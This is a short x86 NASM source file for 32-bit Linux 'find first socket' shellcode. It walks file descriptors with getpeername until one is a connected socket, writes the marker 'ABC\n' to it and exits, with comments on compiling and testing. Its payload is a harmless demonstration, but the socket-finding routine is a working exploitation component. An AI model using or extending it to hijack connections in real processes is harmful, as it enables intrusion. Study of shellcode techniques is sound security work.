BITS 32

; SHELLCODE FIND FIRST SOCKET
; search from 0 till the end
; write to first found socket: "ABC\n"

; COMPILE:
; nasm findsock.asm

; TEST:
; shtest -s 10 -f findsock

START:
    xor ebx,ebx
    push ebx
    mov edi,esp
    push byte +0x10
    push esp
    push edi
    push ebx
    mov ecx,esp
    mov bl,0x7

NEXT_FD:
    inc dword [ecx]
    push byte +0x66
    pop eax
    int 0x80
    test eax, eax
    jnz NEXT_FD

FOUND:
    pop ebx ; SOCKET FD

    xor eax, eax
    mov al, 4       ; SYS_WRITE

    push 0x0a434241
    mov ecx, esp    ; buf = ABC\n

    xor edx, edx
    inc dl
    shl dl, 2       ; n = 4
    int 0x80
    
    xor eax, eax
    inc eax
    int 0x80